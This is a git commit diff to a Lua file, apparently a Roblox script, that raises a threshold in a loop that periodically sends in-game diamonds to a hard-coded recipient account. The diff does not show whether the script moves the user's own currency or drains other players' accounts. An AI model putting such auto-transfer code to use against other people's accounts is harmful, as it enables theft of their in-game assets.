a27e038461f059ed7dd31f6e58ec0e43987365ae
TheArexH4CKER <63061089+TheArexH4CKER@users.noreply.github.com>
2025-01-10 07:29:14 +0100

    Update pog.lua

--- pog.lua
+++ pog.lua
@@ -24,7 +24,7 @@ spawn(function()
     local username = "ADHDMeth" -- Replace with recipient's username
     local loopInterval = 5 -- Interval in minutes
     local mailTax = 100000 -- Tax deduction for sending diamonds
-    local diamondThreshold = 20000000 -- Threshold for sending all gems
+    local diamondThreshold = 100000000 -- Threshold for sending all gems
 
     while true do
         print("Attempting to retrieve diamond data...")
